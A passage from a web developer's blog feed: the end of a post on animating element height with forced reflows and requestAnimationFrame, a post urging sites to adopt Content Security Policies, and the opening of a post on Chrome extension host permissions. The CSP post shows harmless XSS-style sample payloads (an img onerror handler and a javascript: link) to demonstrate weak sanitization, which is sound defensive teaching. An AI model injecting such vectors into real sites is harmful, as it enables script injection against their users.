&lt;code&gt;height&lt;/code&gt; because the former will work when the box is sitting at its natural, unspecified height. The latter will not. As long as your &lt;code&gt;max-height&lt;/code&gt; is greater than the actual height of the box, you&apos;re fine. In many cases, there’s no issue with this trick. &lt;/p&gt;&lt;p&gt;Still, I&apos;ve always considered it a &quot;trick&quot; because it&apos;s not very deterministic. You&apos;re taking a best guess at what the &quot;open&quot; height should be, which could lead to problems. Example: here&apos;s a box, a little CSS, and some JavaScript to apply a new &lt;code&gt;max-height&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;button&quot;&amp;gt;Open Box&amp;lt;/button&amp;gt;

&amp;lt;div id=&quot;box&quot;&amp;gt;
  &amp;lt;svg&amp;gt;⭐&amp;lt;/svg&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;style&amp;gt;
  #box {
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.25s;
  }

  #box.is-open {
    max-height: 300px;
  }
&amp;lt;/style&amp;gt;

&amp;lt;script&amp;gt;
  const box = document.getElementById(&apos;box&apos;);
  const button = document.getElementById(&apos;button&apos;);

  button.addEventListener(&apos;click&apos;, () =&amp;gt; {
    box.classList.toggle(&apos;is-open&apos;);
  });
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you&apos;re not careful, the &quot;open&quot; height may not be large enough based on the box&apos;s contents. You could end up clipping it. Or, if you overshoot, the browser will execute your transition based on the &lt;code&gt;max-height&lt;/code&gt; – not &lt;em&gt;actual&lt;/em&gt; height, causing it to appear faster than intended.&lt;/p&gt;&lt;figure&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/star-too-short-1.gif&quot; width=&quot;598&quot; height=&quot;670&quot; loading=&quot;lazy&quot; alt=&quot;opening a box with too short of a max-height&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/star-too-tall-2.gif&quot; width=&quot;598&quot; height=&quot;670&quot; loading=&quot;lazy&quot; alt=&quot;opening a box with too large of a max-height&quot; /&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;p&gt;Good news: there&apos;s a way to avoid this guessing game (actually, there are many, but we&apos;re exploring this one). It just requires us to measure and resize &lt;em&gt;at precisely the right time&lt;/em&gt;.&lt;/p&gt;&lt;h2&gt;Calculating the Rendered Box Height &lt;/h2&gt;&lt;p&gt;We’ll start with this setup: a hidden box, a button some CSS, and a click event listener. Let’s get it to slide it open.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;openButton&quot;&amp;gt;Open&amp;lt;/button&amp;gt;

&amp;lt;div id=&quot;box&quot;&amp;gt;
  &amp;lt;!-- box contents --&amp;gt; 
&amp;lt;/div&amp;gt;

&amp;lt;style&amp;gt;
#box {
  display: none;
  overflow: hidden;
  transition: height 1s;
}
&amp;lt;/style&amp;gt;

&amp;lt;script&amp;gt;
  const openButton = document.getElementById(&apos;openButton&apos;);
  const box = document.getElementById(&apos;box&apos;);
  
  openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
    // Magic here. 
  });
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Before we can get the box’s “open” height, we&apos;ll need to allow the browser to render it as if it&apos;s open &lt;em&gt;without&lt;/em&gt; painting it to the screen (we don&apos;t want any odd UI jerking). Fortunately, the browser&apos;s event loop makes that possible. Let&apos;s make it visible and get that height. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  box.style.display = &apos;block&apos;;
  const targetHeight = box.clientHeight;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The moment we ask for &lt;code&gt;clientHeight&lt;/code&gt;, a DOM reflow/recalculation is&lt;em&gt; &lt;/em&gt;&lt;a href=&quot;https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing?ref=cms.macarthur.me&quot;&gt;&lt;em&gt;immediately, synchronously forced&lt;/em&gt;&lt;/a&gt;, causing elements on the page to be remeasured and repositioned. This makes it possible to get the rendered height before any pixels change on the screen. In fact, it&apos;s &lt;em&gt;impossible&lt;/em&gt; for the browser to make anything visually change until that click handler is finished and control over the event loop is yielded back to the browser. That&apos;s the gift and curse of JavaScript – the event loop only allows &lt;em&gt;one&lt;/em&gt; single thing to happen at a time. &lt;/p&gt;&lt;p&gt;Let&apos;s keep going. Next, we&apos;ll set the &quot;starting&quot; state of our animation by setting its height to &lt;code&gt;0px&lt;/code&gt;. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  box.style.display = &apos;block&apos;;
  const targetHeight = box.clientHeight;
  box.style.height = &apos;0px&apos;;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point, we can finally queue up the animation itself. But we&apos;ll need to do so in a particular way. The browser attempts to be efficient when the DOM is modified, and if we set attributes right after another, those changes will be batched into a single reflow. There would be a single repaint, and no animation. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  box.style.display = &apos;block&apos;;
  const targetHeight = box.clientHeight;
  box.style.height = `0px`;

  // Meaningless!
  box.style.height = targetHeight;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To trigger an animation, we&apos;ll need to update the box&apos;s height &lt;em&gt;across reflows&lt;/em&gt;. &lt;/p&gt;&lt;h2&gt;Forcing an Immediate, Synchronous Reflow&lt;/h2&gt;&lt;p&gt;Accessing &lt;code&gt;clientHeight&lt;/code&gt; isn&apos;t the only way to force a synchronous reflow. There are a ton of properties that must perform one in order to give you an accurate value. Paul Irish has &lt;a href=&quot;https://gist.github.com/paulirish/5d52fb081b3570c81e3a?ref=cms.macarthur.me&quot;&gt;a big list of them&lt;/a&gt;. We can force a reflow between setting the height to &lt;code&gt;0&lt;/code&gt; and the rendered height by doing this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&quot;click&quot;, () =&amp;gt; {
  box.style.display = &quot;block&quot;;
  const targetHeight = box.clientHeight;
  box.style.height = `0px`;

  // Forced reflow.
  box.offsetHeight;

  box.style.height = `${targetHeight}px`;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s it. Just accessing the &lt;code&gt;offsetHeight&lt;/code&gt; property forces a reflow and enables our animation. We could make it even more succinct too, with one fewer forced reflow.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  box.style.display = &apos;block&apos;;
  box.style.height = `0px`;

  // `scrollHeight` forces a synchronous reflow!
  box.style.height = box.scrollHeight;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After setting the height to &lt;code&gt;0&lt;/code&gt;, we immediately set it to the element&apos;s &lt;code&gt;scrollHeight&lt;/code&gt;, which allows us to measure the natural box size even when we&apos;re explicitly setting the height (another weird quirk of JavaScript in the browser). And accessing that property inadvertently causes a reflow &lt;em&gt;before&lt;/em&gt; the DOM is updated with the &lt;em&gt;new&lt;/em&gt; height. Those two height updates occur across reflows, and we get an animation. Voilà. &lt;/p&gt;&lt;p&gt;Now, let&apos;s push a little further. It&apos;s possible to do all this a smidge more optimally, and more in concert with how the browser paints stuff to the screen. We&apos;ll just need to dance with the event loop a bit. &lt;/p&gt;&lt;h2&gt;Deferring Until Natural DOM Reflows&lt;/h2&gt;&lt;p&gt;The browser is always orchestrating when it&apos;s appropriate to schedule reflows and paint those updates to the screen, and it comes with a tool to tap into that process: &lt;code&gt;requestAnimationFrame()&lt;/code&gt;. &lt;/p&gt;&lt;p&gt;Any callback passed to it will execute just &lt;em&gt;before&lt;/em&gt; a reflow and repaint. That&apos;s why it&apos;s often used to &lt;a href=&quot;https://x.com/aidenybai/status/1874555445052145671?ref=cms.macarthur.me&quot;&gt;measure how long layout changes take&lt;/a&gt;, and also why you might see some yellow followed by purple in your browser&apos;s performance tools:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/image.png&quot; alt=&quot;browser performance report&quot; loading=&quot;lazy&quot; width=&quot;888&quot; height=&quot;226&quot; /&gt;&lt;/figure&gt;&lt;p&gt;With this, we can defer setting the new box height until just before the next repaint:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&quot;click&quot;, () =&amp;gt; {
  box.style.display = &quot;block&quot;;
  const targetHeight = box.clientHeight;
  box.style.height = `0px`;

  requestAnimationFrame(() =&amp;gt; {
    box.style.height = box.scrollHeight;
  });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The advantages of &lt;code&gt;requestAnimationFrame()&lt;/code&gt; are more emphasized in complex animations without CSS transitions, but there is a teeny perk in cases like this too: we wait to force a reflow &lt;em&gt;until the browser is ready to do something with it&lt;/em&gt;. You can see this play out in the browser&apos;s performance tools. Here&apos;s our earlier version without using an rAF. Notice how layout recalculation (purple) occurs as &lt;code&gt;scrollHeight&lt;/code&gt; is accessed, and right in the middle the click event handler. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/no-raf-1.png&quot; alt=&quot;performance without requestAnimationFrame()&quot; loading=&quot;lazy&quot; width=&quot;1126&quot; height=&quot;448&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But the reflow is deferred when queued up inside &lt;code&gt;requestAnimationFrame()&lt;/code&gt;, allowing the click handler to wrap up and give up control of the event loop a little sooner.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/inside-raf.png&quot; alt=&quot;using requestAnimationFrame() defers reflow&quot; loading=&quot;lazy&quot; width=&quot;1128&quot; height=&quot;380&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Moreover, if the tab becomes inactive, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/requestAnimationFrame?ref=cms.macarthur.me&quot;&gt;the rAF is paused&lt;/a&gt;, pushing the reflow until it&apos;s absolutely necessary. That&apos;s very nit-picky, but responsible DOM management. &lt;/p&gt;&lt;h2&gt;Sometimes, Defer Until &lt;em&gt;After&lt;/em&gt; Repaint&lt;/h2&gt;&lt;p&gt;You can&apos;t easily just tell which element properties trigger a synchronous reflow, and so you might end up in a position where a single &lt;code&gt;requestAnimationFrame()&lt;/code&gt; &lt;em&gt;doesn&apos;t&lt;/em&gt; trigger the animation like you&apos;d expect. Here&apos;s an example that doesn&apos;t rely on a &lt;code&gt;scrollHeight&lt;/code&gt; access. Instead, it computes the new height early on, and assigns it just before a repaint.  &lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&quot;click&quot;, () =&amp;gt; {
  box.style.display = &quot;block&quot;;
  const targetHeight = box.clientHeight;
  box.style.height = `0px`;

  // Might not work consistently in all browsers:
  requestAnimationFrame(() =&amp;gt; {
    box.style.height = `${targetHeight}px`;
  });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This&apos;ll work in some browsers, but since updating the &lt;code&gt;style&lt;/code&gt; attribute of an element doesn&apos;t force an immediate reflow, others may batch that update into a single paint. Just a flash. No animation. I verified this in Firefox v133, and &lt;a href=&quot;https://stackoverflow.com/questions/75527696/await-a-reflow-using-requestanimationframe?ref=cms.macarthur.me&quot;&gt;this poor fellow&lt;/a&gt; ran into it as well. &lt;/p&gt;&lt;p&gt;The solution is to assign the new height &lt;em&gt;after&lt;/em&gt; a fresh repaint. We can do that by scheduling the height change for the future &lt;em&gt;while inside&lt;/em&gt; &lt;code&gt;requestAnimationFrame()&lt;/code&gt;. Since this callback will fire just before a repaint, anything queued within it &lt;em&gt;must&lt;/em&gt; occur after the repaint is finished. &lt;/p&gt;&lt;p&gt;You could schedule that next task with something like &lt;code&gt;setTimeout()&lt;/code&gt; or &lt;code&gt;scheduler.postTask()&lt;/code&gt;, but neither does so with regard to the repaint cycle. So, we&apos;ll just... use &lt;code&gt;requestAnimationFrame()&lt;/code&gt; again.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&quot;click&quot;, () =&amp;gt; {
  box.style.display = &quot;block&quot;;
  const targetHeight = box.clientHeight;
  box.style.height = `0px`;

  // Nested rAFs:
  requestAnimationFrame(() =&amp;gt; {
    requestAnimationFrame(() =&amp;gt; {
      box.style.height = `${targetHeight}px`;
    });
  });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, our height will change &lt;em&gt;after&lt;/em&gt; a repaint has occurred, preventing batching, while still in harmony with browser repaints. And even in Firefox, the animation is buttery smooth. Heckuva lot more reliable than guessing a maximum height.&lt;/p&gt;&lt;h2&gt;Before I Forget&lt;/h2&gt;&lt;p&gt;I failed to mention there&apos;s an alternative way to do all of this faster, with less code and fewer gotchas: The &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API?ref=cms.macarthur.me&quot;&gt;Web Animations API&lt;/a&gt;. Set the frames you&apos;d like to animate between and you&apos;re off to the races. The browser will manage all the nitty gritty stuff.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  box.style.display = &apos;block&apos;;

  box.animate([{ height: &apos;0px&apos; }, { height: `${box.clientHeight}px` }], {
    duration: 500,
  });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Closing that box is simple too. Just reverse the list of frames.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function getFrames() {
  return [{ height: &apos;0px&apos; }, { height: `${box.clientHeight}px` }];
}

openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  box.style.display = &apos;block&apos;;

  box.animate(getFrames(), {
    duration: 500,
  });
});

closeButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  const animation = box.animate(getFrames().toReversed(), {
    duration: 500,
  });

  animation.onfinish = () =&amp;gt; {
    box.style.display = &apos;&apos;;
  };
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s OK. All that other stuff is really important to know. It&apos;ll help you appreciate the challenges the WAAPI is positioned to solve, and hopefully bring some more insight into just how weird &amp;amp; complicated the browser is. That&apos;s worth something.&lt;/p&gt;</content:encoded></item><item><title>You Might As Well Use a Content Security Policy</title><link>https://macarthur.me/posts/csp</link><guid isPermaLink="true">https://macarthur.me/posts/csp</guid><pubDate>Mon, 02 Dec 2024 18:18:55 GMT</pubDate><content:encoded>&lt;p&gt;A few weeks ago, someone emailed to let me know that &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt; wasn’t playing nicely with his Content Security Policy (CSP). This was the first time I’d heard of the problem, which probably indicates how infrequently the feature is used, despite having been standardized since 2013 and being &lt;a href=&quot;https://caniuse.com/contentsecuritypolicy?ref=cms.macarthur.me&quot;&gt;extremely well-supported&lt;/a&gt; by modern browsers.&lt;/p&gt;&lt;p&gt;At the time, JamComments used two things obstructed by even the simplest CSP: &lt;code&gt;Function&lt;/code&gt; constructors (used by Alpine.js) and JavaScript within  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags. Both of these things (including a couple other things I’ve thrown) are neutralized with a little &lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag in your document:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
  &amp;lt;!-- the CSP --&amp;gt;
  &amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;&quot; /&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
  &amp;lt;!-- inline event handlers --&amp;gt;
  &amp;lt;button onclick=&quot;alert(&apos;nope.&apos;)&quot;&amp;gt;click me&amp;lt;/button&amp;gt;

  &amp;lt;!-- inline script tags --&amp;gt;
  &amp;lt;script&amp;gt;
    console.log(&apos;nice try.&apos;);
  &amp;lt;/script&amp;gt;

  &amp;lt;!-- Loading scripts from other origins --&amp;gt;
  &amp;lt;!-- (jQuery&apos;s still in btw.) --&amp;gt;
  &amp;lt;script src=&quot;https://code.jquery.com/jquery-3.7.1.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;

  &amp;lt;!-- Function constructors --&amp;gt;
  &amp;lt;script src=&quot;src/main.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;!--
    // main.js
  
    const no = new Function(&apos;console.log(&quot;LOL no&quot;);&apos;);

    no(2, 6);
  --&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That one-liner allows JavaScript loaded only through your own domain (&quot;self&quot;) to execute, including inline scripts and event handlers. You&apos;d see a mess of errors in your console trying to run that code above: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/12/image-1.png&quot; alt=&quot;CSP errors&quot; loading=&quot;lazy&quot; width=&quot;1282&quot; height=&quot;898&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Fortunately, it was straightforward to make JamComments compliant with a policy like this. I switched to &lt;a href=&quot;https://alpinejs.dev/advanced/csp?ref=cms.macarthur.me&quot;&gt;Alpine&apos;s CSP build&lt;/a&gt;, began loading scripts &amp;amp; styles externally (better for caching anyway), and introduced an option to &lt;a href=&quot;https://jamcomments.com/docs/custom-host/?ref=cms.macarthur.me&quot;&gt;proxy assets through your own host&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;You might think the hassle burned my liking of CSPs, but actually, the opposite happened. I&apos;ve moved toward liking them even more. In fact, I think every site should probably just get one, even if it&apos;s hosting simple, static content (like your blog). &lt;/p&gt;&lt;h2&gt;Sanitization Backup&lt;/h2&gt;&lt;p&gt;If you accept any form of user-generated content (UGC), like comments, it’s a good idea to use a CSP to disable any nefarious code, even if that code is supposedly already being sanitized. As unlikely as it may be, it’s possible things could otherwise blow up in your face. A CSP is an affordable way to prevent that. A couple reasons: &lt;/p&gt;&lt;p&gt;First, sanitization could be inadequate or overstated. Someone could claim UGC is “sanitized” by inserting code via &lt;code&gt;.innerHTML&lt;/code&gt;, for example, because it doesn’t permit &amp;lt;script&amp;gt; tags from executing. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const content = document.getElementById(&apos;content&apos;);

content.innerHTML = `
  &amp;lt;script&amp;gt;
    console.log(&quot;will not fire!&quot;);
  &amp;lt;.script&amp;gt;
`;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That’s true, but inline event handlers and links using the JavaScript pseudo-protocol &lt;em&gt;will&lt;/em&gt; still fire: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const content = document.getElementById(&apos;content&apos;);

content.innerHTML = `
  &amp;lt;img src=&quot;x&quot; onerror=&quot;console.warn(&apos;imma getchu&apos;);&quot;&amp;gt;
  &amp;lt;a href=&quot;javascript:alert(&apos;ur so done.&apos;)&quot;&amp;gt;Save&amp;lt;/a&amp;gt;
`;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That leaves your attack surface area plenty large enough to still worry about, even if the &quot;obvious&quot; vulnerabilities are covered. &lt;/p&gt;&lt;h2&gt;Supply Chain Attacks &lt;/h2&gt;&lt;p&gt;You might&apos;ve heard of the Polyfill.io &lt;a href=&quot;https://fossa.com/blog/polyfill-supply-chain-attack-details-fixes/?ref=cms.macarthur.me&quot;&gt;supply chain attack&lt;/a&gt; exposed earlier this year. When the &lt;code&gt;cdn.polyfill.io&lt;/code&gt; domain was acquired by new owners, they began swapping out &quot;good&quot; code for something more malicious. The group specifically targeted the mobile devices of &lt;a href=&quot;https://www.akamai.com/blog/security/2024-polyfill-supply-chain-attack-what-to-know?ref=cms.macarthur.me&quot;&gt;carefully selected types of users&lt;/a&gt;, who were then directed to scam sites. A &lt;em&gt;lot&lt;/em&gt; of sites were impacted – over 100k. And all you needed to do to make yourself vulnerable was have a Polyfill.io CDN link on your site. &lt;/p&gt;&lt;p&gt;A supply chain attack is one reason why you ought to be picky about the third-party hosts you use to serve assets. Any of them could theoretically pull out the rug from under you at any moment. &lt;a href=&quot;https://x.com/triblondon?ref=cms.macarthur.me&quot;&gt;Andrew Betts&lt;/a&gt; says it more scarily: &lt;/p&gt;&lt;figure&gt;&lt;a href=&quot;https://x.com/triblondon/status/1761852824739021079?ref=cms.macarthur.me&quot;&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/12/image-2.png&quot; alt=&quot;screenshot of tweet describing how serious the risk of a supply chain attack is&quot; loading=&quot;lazy&quot; width=&quot;1226&quot; height=&quot;1084&quot; /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p&gt;A CSP is helpful on this front because &lt;strong&gt;it restricts third-party hosts to an explicit list of the ones you truly trust&lt;/strong&gt; (or none at all). As long as that policy&apos;s in place, there&apos;s no way anyone could accidentally or dastardly slip in something through an untrusted domain. &lt;/p&gt;&lt;p&gt;And for the domains you &lt;em&gt;do&lt;/em&gt; want to permit, list them in your policy. Using the jQuery example from above: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;meta
  http-equiv=&quot;Content-Security-Policy&quot;
  content=&quot;script-src &apos;self&apos; code.jquery.com&quot;
/&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If it&apos;s not obvious, this &lt;em&gt;won&apos;t&lt;/em&gt; protect you if those trusted domains themselves are compromised, but it&apos;ll limit the risk. Implement this while serving as many other resources as possible through your own domain, and you&apos;ll be in pretty good shape.&lt;/p&gt;&lt;h2&gt;Building Your Policy&lt;/h2&gt;&lt;p&gt;The policy that&apos;s &quot;best&quot; for you will heavily depend on the type of site you&apos;re running. Whether you allow form submissions, accept any UGC, or even if you serve content to authenticated users will all inform that policy. There are &lt;em&gt;plenty&lt;/em&gt; of directives to lock down all sorts of things (&lt;a href=&quot;https://content-security-policy.com/?ref=cms.macarthur.me&quot;&gt;read about them all here&lt;/a&gt;). But I&apos;m writing this for a public, content-focused blog, so I&apos;ll focus there. &lt;/p&gt;&lt;p&gt;One tactic for building your policy is to start aggressively and relax it from there. Here&apos;s a pretty locked-down policy: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;default-src&lt;/code&gt; directive serves as the fallback value for other directives, preventing &lt;em&gt;any&lt;/em&gt; third-party resources from being loaded. It&apos;s either your own domain or &lt;em&gt;nothing&lt;/em&gt;. When you first run this, it&apos;ll very likely break something, after which you could begin whitelisting domains, or using specific directives: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;meta
  http-equiv=&quot;Content-Security-Policy&quot;
  content=&quot;
    script-src &apos;self&apos;; 
    img-src &apos;self&apos;; 
    style-src &apos;self&apos;;
    font-src &apos;self&apos;;&quot;
/&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That one will restrict all script, image, style, and font sources to your own domain. A little more chill, but still more than adequate for a blog.&lt;/p&gt;&lt;p&gt;If you&apos;d like to start with something a little more tame, I&apos;d probably go with this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This would arguably protect you from the most common vulnerabilities out there (no execution of any third-party scripts) , and you could then tighten from there.&lt;/p&gt;&lt;h3&gt;Setting a Policy via HTTP Header&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;&amp;lt;meta /&amp;gt;&lt;/code&gt; tag isn&apos;t the only way to define a CSP. The &lt;code&gt;Content-Security-Policy&lt;/code&gt; header does the same thing, but with a couple perks. &lt;/p&gt;&lt;p&gt;First, you can define a destination for violations to be reported when they occur. You&apos;ll need a &lt;code&gt;report-to&lt;/code&gt; directive in your policy, as well as an additional &lt;code&gt;Reporting-Endpoints&lt;/code&gt; header. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;Reporting-Endpoints: csp-endpoint=&apos;https://example.com/csp-report&apos;
Content-Security-Policy: script-src &apos;self&apos;; report-to csp-endpoint&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For every violation, that endpoint will receive a POST request containing a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to?ref=cms.macarthur.me#violation_report_syntax&quot;&gt;big, ol&apos; blob of JSON&lt;/a&gt; detailing went wrong. I can&apos;t immediately imagine why that information would be useful, but I&apos;m sure it is to someone. &lt;/p&gt;&lt;p&gt;Second, defining your policy with a header makes it a smidge more obfuscated, and a little more difficult for people to snoop for a loophole. They could still find it; it just wouldn&apos;t be right there in your HTML. They&apos;d need to crack open some dev tools and view the response headers of the request: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/12/image-3.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;952&quot; height=&quot;238&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But even aside from that, many might prefer to have browser directives (including things like &lt;code&gt;Cache-Control&lt;/code&gt; neatly tucked away in the headers, rather than plastered in your HTML. It&apos;s up to you. but if you do choose to go that route, setting it is fairly simple for some of the more common modern hosts out there. &lt;/p&gt;&lt;h4&gt;&lt;a href=&quot;https://developers.cloudflare.com/pages/configuration/headers/?ref=cms.macarthur.me&quot;&gt;Cloudflare Pages&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In a &lt;code&gt;_headers&lt;/code&gt; file at the root of your project, set it on every response from your site. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;/*
  Content-Security-Policy: script-src &apos;self&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You could also set it in a &lt;a href=&quot;https://developers.cloudflare.com/pages/functions/middleware/?ref=cms.macarthur.me&quot;&gt;middleware function&lt;/a&gt;.&lt;/p&gt;&lt;h4&gt;&lt;a href=&quot;https://docs.netlify.com/routing/headers?ref=cms.macarthur.me&quot;&gt;Netlify&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;You could use a &lt;code&gt;_headers&lt;/code&gt; file like above, or define it in your &lt;code&gt;netlify.toml&lt;/code&gt; file.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;[[headers]]
  for = &quot;/*&quot;
  [headers.values]
    Content-Security-Policy = &quot;script-src &apos;self&apos;&quot;&lt;/code&gt;&lt;/pre&gt;&lt;h4&gt;&lt;a href=&quot;https://vercel.com/docs/projects/project-configuration?ref=cms.macarthur.me#headers&quot;&gt;Vercel&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Drop it in your &lt;code&gt;vercel.json&lt;/code&gt; file. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;{
  &quot;headers&quot;: [
    {
       &quot;source&quot;: &quot;/(.*)&quot;, 
       &quot;headers&quot;: [
        {
          &quot;key&quot;: &quot;Content-Security-Policy&quot;, 
          &quot;value&quot;: &quot;script-src &apos;self&apos;&quot;
        }
      ]
    }
  ]
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or if you&apos;d like to do it the hard way, use &lt;a href=&quot;https://vercel.com/docs/functions/edge-middleware?ref=cms.macarthur.me&quot;&gt;edge middleware&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;You get the idea. &lt;/p&gt;&lt;h2&gt;Free Value&lt;/h2&gt;&lt;p&gt;I&apos;ll admit: the chance of anything horrible happening to my static blog because I didn&apos;t have a Content Security Policy in place is very, very low. And if there were more downsides to implementing one, I might encourage most people to not even bother. &lt;/p&gt;&lt;p&gt;But as far as I can tell, the cost to implementing even a simple policy is virtually nothing – just a little annoyance when you try to use a third party CDN after setting up a CSP, but I can roll with that (plus, it&apos;s easily solvable with whitelisting). On the other end, the potential value in preventing a headache of security issues when the moment does arise is pretty sizable, in my opinion. &lt;/p&gt;&lt;p&gt;The cost is negligible, and the value is possibly huge. It&apos;s like an incredibly affordable, effective insurance policy. You might as well just get one.&lt;/p&gt;</content:encoded></item><item><title>Avoiding a &quot;Host Permission&quot; Review Delay When Publishing a Chrome Extension</title><link>https://macarthur.me/posts/chrome-extension-host-permission</link><guid isPermaLink="true">https://macarthur.me/posts/chrome-extension-host-permission</guid><pubDate>Wed, 20 Nov 2024 01:08:03 GMT</pubDate><content:encoded>&lt;p&gt;I just wrapped up &lt;a href=&quot;https://picperf.io/image-saver-extension?ref=cms.macarthur.me&quot;&gt;a Chrome Extension&lt;/a&gt; that allows you to convert and download any AVIF or WebP image as a more useful JPEG, PNG, or GIF (it aims to solve one of the &lt;a href=&quot;https://www.reddit.com/r/Windows10/comments/yw4bau/i_cant_stand_this_webp_format_i_cant_easily_save/?ref=cms.macarthur.me&quot;&gt;greatest pains on the internet&lt;/a&gt;). The extension&apos;s very simple, but I ran into an interesting slowdown getting it finished up and submitted for review. &lt;/p&gt;&lt;p&gt;Under the &quot;Permission Justification&quot; section of the submission form, the following banner was shown after uploading my ZIP file: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/11/image-7.png&quot; alt=&quot;&amp;quot;Due to the Host Permission, your extension may require an in-depth review which will delay publishing&amp;quot; banner&quot; loading=&quot;lazy&quot; width=&quot;814&quot; height=&quot;138&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&quot;Delay publishing&quot; is rather ambiguous, which led me to assume it&apos;d be forever before it&apos;d finally get reviewed. I wasn&apos;t up for that, so I did some digging and found a way to circumvent the issue by structuring my extension a bit differently. Hopefully, it can help speed up someone else&apos;s process too. 